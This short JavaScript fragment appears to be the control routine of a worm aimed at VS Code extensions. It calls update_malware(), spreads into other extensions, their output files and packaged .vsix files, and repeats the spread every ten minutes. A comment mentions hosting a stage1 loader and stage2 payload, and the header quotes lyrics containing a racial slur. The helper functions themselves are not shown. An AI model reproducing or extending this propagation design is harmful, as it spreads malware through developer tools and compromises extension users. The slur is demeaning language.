/*
 *  flawless victory, ya niggas can't do shit to me
 *  physically, lyrically, hypothetically, realistically
 */

// XXX find a decent host for stage1 loader & stage2.bin

update_malware();

/* spread to other extension's output files if opened in workspace */
extension_js_spread();

/* spread to other extensions in case we get nuked */
extension_spread();

/* spread to any packaged extensions in the current directory */
vsix_spread();

/* keep spreading in case the files get updated / created */
setInterval(vsix_spread, 600000);